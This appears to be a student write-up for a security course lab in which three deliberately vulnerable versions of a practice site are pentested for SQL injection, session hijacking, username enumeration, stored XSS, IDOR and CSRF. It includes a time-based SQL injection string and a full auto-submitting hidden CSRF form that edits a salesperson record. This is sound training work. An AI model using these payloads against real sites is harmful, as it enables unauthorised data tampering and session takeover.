# Codepath-Security-Week-8

# Project 8 - Pentesting Live Targets

Time spent: 8 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL injection
When we insert an SQL statement say ' OR SLEEP(3)=0--' in the end of a salesperson URL the injection will be sucessful and 
the website will sleep for 3 seconds.  This will not work for the red or green websites.
GIF Walkthrough:
https://gfycat.com/gifs/detail/SnappyEnlightenedCaribou

Vulnerability #2: Session Hijacking/Fixation
Use the session ID of a logged in browser for the blue site and copy it.  Now on a different browser (I used chrome) use that copied session ID and
change the session ID of a signed out browser.  Go to the public section of the blue site and notice that the session ID
that was pasted now has admin priviledges.
GIF Walkthrough:
https://gfycat.com/gifs/detail/PlaintiveWhimsicalKarakul

## Green

Vulnerability #1: Username Enumeration
When attempting to login with a correct username and failed password an error message "Log in was unsuccessful"
will appear in bold.  However, in the green website when an incorrect username and password is inputted the error message
appears not in bold.  This will give any unwanted person information that usernames that receive a "Log in was unsuccessful" message
in bold are the database. 
GIF Walkthrough:
https://gfycat.com/gifs/detail/JovialLinedBuffalo

Vulnerability #2: Cross-Site Scripting (XSS)
When submitting feedback using the contact us section.  Enter in an alert script in the feedback section.
This will place a stored XSS attack and can be activated when the user opens the feedback section.  
GIF Walkthrough:
https://gfycat.com/gifs/detail/AcclaimedIncredibleHorse

## Red

Vulnerability #1: Insecure Direct Object Reference (IDOR)
I noticed a clue when checking the salespeople in the admin section.  There were two salepeople that weren't suppose
to been seen in the public site.  So, all three sites were tested when checking to see if these two people were
able to be seen by changing the url ID in the salesperson page.  It turned out that in the red site we were able 
to see the two people in the public site.
GIF Walkthrough:
https://gfycat.com/gifs/detail/DishonestDifferentGoitered


Vulnerability #2: Cross-Site Request Forgery (CSRF)
By creating a hidden form and pointing it an edit url for salespeople, we can automatically edit data. This was tested and
was successful on the red site.  First open up the hidden form and then check the salespeople section for the newly entered person.
GIF Walkthrough:
https://gfycat.com/gifs/detail/FlawlessGratefulBobcat

## Notes
Here is what was inside the Hidden form html file.

<html>
  <head>
    <title>Hidden Form</title>
  </head>
  <body onload="document.edit_salesperson.submit()">
    <form action="https://35.193.135.101/red/public/staff/salespeople/edit.php?id=5" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Timothy"><br>
      <input type="text" name="last_name" value="Lee"><br>
      <input type="text" name="phone" value="123-567-8901"><br>
      <input type="text" name="email" value="yougothacked@hack.com"><br>
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html
